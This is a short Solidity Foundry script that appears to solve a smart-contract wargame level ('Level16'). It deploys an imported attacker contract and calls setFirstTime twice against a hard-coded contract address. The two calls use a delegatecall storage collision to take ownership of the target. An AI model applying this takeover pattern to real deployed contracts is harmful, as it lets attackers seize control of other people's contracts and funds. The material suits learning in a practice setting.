// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level16.sol";
import "../src/Level16-Attacker.sol";

contract AttackerScript is Script {
    Level16 public level16 = Level16(0xF0b31d2b1C8F7C826627f689221B206c1ec7CbDe);
    AttackerLevel16 public attacker;


    function run() public {
      address perso = vm.addr(1); // put your public address here associated with the .env private_key
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attacker = new AttackerLevel16();

      //Set our attacker address
      level16.setFirstTime(uint256(uint160(address(attacker))));

      //Call the delegatecall to trigger our attacker with our address
      level16.setFirstTime(uint256(uint160(perso)));

      vm.stopBroadcast();
    }
}
